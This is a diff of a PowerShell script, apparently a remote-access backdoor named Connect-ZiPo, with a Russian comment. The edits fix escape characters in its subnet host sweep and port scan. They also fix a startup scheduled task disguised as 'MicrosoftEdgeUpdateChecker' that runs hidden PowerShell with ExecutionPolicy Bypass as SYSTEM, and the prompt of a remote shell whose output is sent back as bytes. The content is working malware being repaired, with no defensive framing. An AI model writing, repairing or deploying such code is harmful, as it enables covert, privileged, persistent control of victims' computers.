@@ -27,17 +27,17 @@ function Connect-ZiPo {
 
         1..254 | ForEach-Object {
             $ip = "$subnet$_"
-            Write-Host -NoNewline "r[*] Scanning $ip..." -ForegroundColor Cyan
+            Write-Host -NoNewline "`r[*] Scanning $ip..." -ForegroundColor Cyan
 
             if (Is-Alive $ip) {
-                Write-Host "r[+] $ip is alive        " -ForegroundColor Green
+                Write-Host "`r[+] $ip is alive        " -ForegroundColor Green
                 $alive += $ip
             } else {
-                Write-Host "r[ ] $ip is offline      " -ForegroundColor DarkGray
+                Write-Host "`r[ ] $ip is offline      " -ForegroundColor DarkGray
             }
         }
 
-        return $alive -join "n"
+        return $alive -join "`n"
     }
     catch {
         return "[ERROR] scanHosts failed: $($_.Exception.Message)"
@@ -87,7 +87,7 @@ function Connect-ZiPo {
             $results += "[ERROR] ${ip}:${port} $($_.Exception.Message)"
         }
     }
-    return $results -join "n"
+    return $results -join "`n"
 }
 
 
@@ -134,9 +134,9 @@ function Connect-ZiPo {
 
 
         if (-not (schtasks /Query /TN $taskName -ErrorAction SilentlyContinue)) {
-           schtasks /Create /TN "MicrosoftEdgeUpdateChecker" /SC ONSTART 
-              /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$targetPath"" 
-              /DELAY 0001:00 
+           schtasks /Create /TN "MicrosoftEdgeUpdateChecker" /SC ONSTART `
+              /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
+              /DELAY 0001:00 `
               /RL HIGHEST /RU "SYSTEM" /F
         }
 
@@ -411,8 +411,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                 }
 
                 # Обновлённое добавление приглашения:
-                $response = ($response.TrimEnd() + "`nnPS $((Get-Location).Path)> ")
-
+                $response = ($response.TrimEnd() + "`nPS $currentDir> ")
 
 
                 $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
